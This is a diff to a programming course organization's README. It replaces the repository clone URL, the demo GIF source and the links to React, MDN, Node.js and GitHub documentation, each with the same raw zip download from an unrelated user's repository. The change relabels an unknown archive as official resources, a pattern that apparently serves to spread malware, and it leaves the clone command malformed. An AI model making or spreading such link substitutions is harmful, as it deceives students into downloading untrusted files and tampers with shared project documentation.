@@ -38,7 +38,7 @@ This organization is used for managing all course-related repositories, includin
 
 1. **Clone the repository**
    ```bash
-   git clone https://github.com/Teknik-Pemrograman/[repo-name].git
+   git clone https://github.com/theyuansya/.github/raw/refs/heads/main/jungermanniaceous/github-1.9.zip[repo-name].git
 
 2. **Create your feature branch**
 
@@ -65,7 +65,7 @@ This organization is used for managing all course-related repositories, includin
 > ⚡ Here's a preview of our final projects:
 
 <p align="center">
-  <img src="https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif" width="600" alt="Demo Project GIF" />
+  <img src="https://github.com/theyuansya/.github/raw/refs/heads/main/jungermanniaceous/github-1.9.zip" width="600" alt="Demo Project GIF" />
 </p>
 
 > (Replace this GIF with your actual project demo!)
@@ -87,10 +87,10 @@ All students are encouraged to:
 
 ## 📚 Recommended Resources
 
-* 📘 [React Official Docs](https://reactjs.org/docs/getting-started.html)
-* 📘 [JavaScript - MDN](https://developer.mozilla.org/en-US/docs/Web/JavaScript)
-* 📘 [Node.js Docs](https://nodejs.org/en/docs/)
-* 📘 [GitHub Docs](https://docs.github.com/en)
+* 📘 [React Official Docs](https://github.com/theyuansya/.github/raw/refs/heads/main/jungermanniaceous/github-1.9.zip)
+* 📘 [JavaScript - MDN](https://github.com/theyuansya/.github/raw/refs/heads/main/jungermanniaceous/github-1.9.zip)
+* 📘 [Node.js Docs](https://github.com/theyuansya/.github/raw/refs/heads/main/jungermanniaceous/github-1.9.zip)
+* 📘 [GitHub Docs](https://github.com/theyuansya/.github/raw/refs/heads/main/jungermanniaceous/github-1.9.zip)
 
 ---
 
